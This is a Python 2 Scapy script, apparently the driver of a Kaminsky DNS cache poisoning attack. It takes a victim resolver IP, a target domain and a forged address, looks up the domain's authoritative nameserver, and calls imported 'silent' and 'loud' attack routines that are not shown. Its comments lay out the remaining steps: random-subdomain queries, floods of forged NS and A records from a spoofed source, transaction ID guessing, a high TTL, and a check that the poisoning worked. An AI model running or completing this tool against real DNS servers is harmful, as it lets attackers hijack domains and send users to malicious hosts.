from scapy.all import *
import sys
# input processing
import argparse
# validate input IP and domain
import validators
# used to get the current public IP
from json import load
from urllib2 import urlopen
# custom modules
from kaminskySilent import silent as silent
from kaminskyLoud import loud as loud

# collect command line input
parser = argparse.ArgumentParser(description='Kaminsky DNS', prog='kaminsky')
parser.add_argument('victim', nargs='?', help='Victim DNS server (provide IP)', metavar='victimIP')
parser.add_argument('targetDomain', nargs='?', help='Target domain that is to be poisoned in the cache (provide URL)', metavar='targetDomain')
parser.add_argument('addressToForge', nargs='?', help='Server to be spoofed as target domain\'s authoritate DNS server (provide IP)', metavar='yourDNSIP')
parser.add_argument('-s', '--silent', dest='silent', action='store_true', default='False')
parser.add_argument('-l', '--loud', dest='silent', action='store_false')

args = parser.parse_args()

# validate the input
if not validators.ipv4(args.victim):
    print 'Victim is not a valid IP address\nTerminating...'
    sys.exit()

if not validators.domain(args.targetDomain): #supports IDN
    print 'Target is not a valid domain\nTerminating...'
    sys.exit()

if args.addressToForge == 'myip' or args.addressToForge == 'myIP':
    # get user's current IP address from this URL
    args.addressToForge = load(urlopen('http://jsonip.com'))['ip']
elif not validators.ipv4(args.addressToForge):
    print 'Spoofing IP is not a valid IP address\nTerminating...'
    sys.exit()

# get authoritative nameserver for the target domain (domain and IP)
# authoritative nameserver's domain
ans = sr1(IP(dst='77.244.128.44') / UDP() / DNS(rd=1, qd=DNSQR(qname=args.targetDomain, qtype=6))) # query nameserver for SOA (start of authority) record of targetDomain, this answer will be used as src for the packet that poisons the vicitim's cache
args.soaDomain = ans[DNS].ns.rdata # get the authoritative nameserver's domain
# authoritative nameserver's IP
ans = sr1(IP(dst='77.244.128.44') / UDP() / DNS(rd=1, qd=DNSQR(qname=args.soaDomain)))
args.soaIP = ans[DNS].an.rdata # get the authoritative nameserver's IP

# print the starting message and start
out = '\nVictim DNS: ' + args.victim + '\nTarget domain: ' + args.targetDomain + '\nSpoofing IP: ' + args.addressToForge + '\nMethod: '
if args.silent:
    print (out + 'silent')
else:
    print (out + 'loud')
print '\nStarting sequence\n'

if args.silent:
    silent(args)
else:
    loud(args)

# check whether the supplied DNS server is authoritative and whether it supports reccursion
# if not print and terminate (authoritative nameservers give the RR imidiately without search so they cannot be poisoned, recursion has to be supported)

# set args.incremental to True or False depending on whether the TXID is incremental
# if the TXID is incremental we can find it out in the following way:
#   DNS client asks for a test domain of which he knows he's authoritative for (at one point the DNS server will ask his nameserver for the IP)
#   normal recursive search happens
#   DNS server asks his nameserver for the IP
#   we can check the source port and the TXID of this packet
# if the TXID is incremental we know which TXID will be for the next packet

# loop:
# send the query with the target domain to the victim (generate random subdomain, i.e. 1234www5678.example.com)

# after this the victim will start asking other DNS servers (after first try others will be cached so the victim will only ask the authoritative server) for the IP
# flood the victim with the forged query answers including the addressToForge
# each of the packets should contain an NS and an A record: NS record - targetDomain NS args.soaDomain ; A record - args.soaDomain A addressToForge ; at the same time the authoritative server will be sending the same A record but instead of addressToForge he will put his IP (args.soaIP)
# try as many TXID combinations as possible (maybe implement calculation of toplogical distance to calculate the number of queries) and set TTL to a very high value
# make sure to set the source IP to args.soaIP

# in case the last step fails (no cache poisoning) redo the loop
# there needs to be a step here to check whether the cache poisoning worked (send a query to the vicitim DNS server and check the answer)
